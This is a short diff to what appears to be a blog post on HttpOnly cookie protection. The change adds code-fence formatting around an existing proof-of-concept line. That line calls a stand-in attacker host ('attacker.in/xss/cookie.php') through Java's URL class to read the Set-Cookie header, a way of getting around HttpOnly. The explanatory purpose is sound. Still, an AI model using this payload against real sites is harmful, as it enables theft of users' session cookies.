@@ -34,7 +34,9 @@ date: 2013-03-24 20:55:47 +0800
 ##### Java getHeaderField
 POC:
 
+```javascript
     alert(new java.net.URL('http://attacker.in/xss/cookie.php').openConnection().getHeaderField('set-cookie'));
+```
 
 ### 参考
 1. [https://www.owasp.org/index.php/HttpOnly](https://www.owasp.org/index.php/HttpOnly)
